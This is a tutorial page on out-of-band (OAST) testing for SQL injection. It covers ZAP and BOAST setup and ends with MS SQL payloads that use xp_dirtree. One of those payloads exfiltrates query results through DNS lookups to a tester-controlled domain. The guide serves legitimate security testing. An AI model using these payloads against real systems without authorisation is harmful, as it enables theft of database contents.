---
layout: default
title: My way of testing SQL Injection - Part 2 - OAST Testing
parent: SQL Injection
nav_order: 2
---

### What is OAST testing?

OAST testing is Out of band Application Security Testing where we send a payload to the server that causes an interaction with an external system we have control over, that sits outside the target domain. 

### Why is OAST testing is important?

You can directly exfiltrate data via the out-of-band channel, for example by placing the data into a DNS lookup for a domain that you control. 

### How OAST testing works?

Let us consider we have a domain, we own. If anyone send DNS lookup for that domain, we will be able to see the details for that request. So let use now consider, we created a payload that will send the DNS lookup along with the details from the target system to our domain , we will be able to see the details in the dump. 

### OAST testing using ZAP

#### Setting up ZAP for OAST testing

*   Download the latest OWASP ZAP.
*   Go to tools → Options
*   You can search for OAST.
*   In OAST options screen, go to BOAST tab
*   You can see the server URI and Polling frequency inputs. 
*   You can set up your own server .Server URI address should point to the URI that will be used for registrations and polling.A valid URI will include the scheme, the host, the port, and the `/events` endpoint. The host must be running a working instance of BOAST. An example of a valid URI is: [`https://example.com:1337/events`.](https://example.com:1337/events.)
*   click on register.
*   You will notice that a new entry has been added to _Active Servers_ table. You can copy the payload with `ctrl` + `C` to use it in your attacks.
*   ZAP will now poll this server at the frequency you set and report all interactions (DNS, HTTP) with the payload URI in the OAST tab in the main screen.

Similar to ZAP, you can use Burpsuite collaborator which comes with [Burp Suite Enterprise Edition](https://portswigger.net/burp/enterprise) and [Burp Suite Professional](https://portswigger.net/burp/pro) 

#### Testing 

Now you have the payload. For example,  nbtgsasdaspgvy6glznbom2lj5q.odiss.eu .

If you go to the browser and enter this URL [http://abcd.nbtgsasdaspgvy6glznbom2lj5q.odiss.eu](http://abcd.nbtgsasdaspgvy6glznbom2lj5q.odiss.eu) , then you will see the entry in the OAST tab which says you got the get request for the URL http://abcd.nbtgsasdaspgvy6glznbom2lj5q.odiss.eu

### Usage of OAST in SQL injection

Now let us consider, your target server using MS DB. You can confirm the vulnerability by using this payload `exec master..xp_dirtree '//DOMAIN-NAME/a'`

If you want to ex-filtrate the data, you can use the payload `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.DOMAIN-NAME/a"')`